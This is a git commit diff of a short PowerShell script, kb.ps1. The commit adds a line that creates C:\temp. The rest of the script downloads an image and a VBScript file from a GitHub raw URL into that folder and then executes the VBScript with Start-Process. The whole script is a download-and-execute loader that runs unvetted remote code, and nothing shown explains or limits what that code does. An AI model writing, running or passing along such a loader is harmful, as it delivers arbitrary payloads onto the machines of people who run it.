ce740385d4d2b776dba9a8c4764d20b481798231
calebpmiller <calebpmiller@users.noreply.github.com>
2018-12-07 11:11:30 -0600

    Update kb.ps1

--- kb.ps1
+++ kb.ps1
@@ -1,3 +1,4 @@
+cmd /c "md C:\temp"
 (new-object System.Net.WebClient).Downloadfile("https://i.ytimg.com/vi/qyYHWkVWQ4o/maxresdefault.jpg","C:\temp\kb.jpg")
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/calebpmiller/Files/master/kb.vbs","C:\temp\kb.vbs")
 Start-Process -FilePath C:\temp\kb.vbs
